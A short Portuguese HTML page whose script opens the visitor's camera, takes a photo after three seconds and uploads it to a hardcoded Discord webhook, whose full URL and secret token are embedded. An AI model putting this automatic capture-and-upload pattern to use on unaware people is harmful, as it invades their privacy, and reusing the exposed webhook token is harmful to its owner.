<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8" />
  <title>Captura e Envio para Discord</title>
  <style>
    body { font-family: Arial, sans-serif; padding: 20px; text-align: center; }
    video, img { max-width: 90vw; max-height: 60vh; margin-top: 10px; border: 2px solid #333; }
  </style>
</head>
<body>
  <h1>Captura de Câmera e Envio para Discord</h1>
  <p>Permita o acesso à câmera e aguarde 3 segundos para tirar uma foto e enviar para o Discord.</p>
  <video id="video" autoplay playsinline></video>
  <div>
    <h2>Foto capturada:</h2>
    <img id="photo" alt="Sua foto aparecerá aqui" />
  </div>

  <script>
    const video = document.getElementById('video');
    const photo = document.getElementById('photo');
    const webhookURL = 'https://discord.com/api/webhooks/1391682825329180752/ym0kJ2YnOS0bFj5VK0EpK2K3T-BZtmYI4xRYxaBK-DReqeo75zkUTh_CIip1gtaVbPBi'; // Coloque aqui o seu webhook do Discord

    async function startCamera() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = stream;

        setTimeout(() => {
          const canvas = document.createElement('canvas');
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          const ctx = canvas.getContext('2d');
          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
          canvas.toBlob(async (blob) => {
            // Mostra a foto na tela
            const url = URL.createObjectURL(blob);
            photo.src = url;

            // Envia para o Discord
            const formData = new FormData();
            formData.append('file', blob, 'photo.png');

            try {
              const response = await fetch(webhookURL, {
                method: 'POST',
                body: formData
              });
              if (!response.ok) {
                alert('Erro ao enviar a foto para o Discord: ' + response.statusText);
              }
            } catch (err) {
              alert('Erro na requisição para o Discord: ' + err.message);
            }
          }, 'image/png');
        }, 3000);
      } catch (err) {
        alert('Erro ao acessar a câmera: ' + err.message);
      }
    }

    startCamera();
  </script>
</body>
</html>
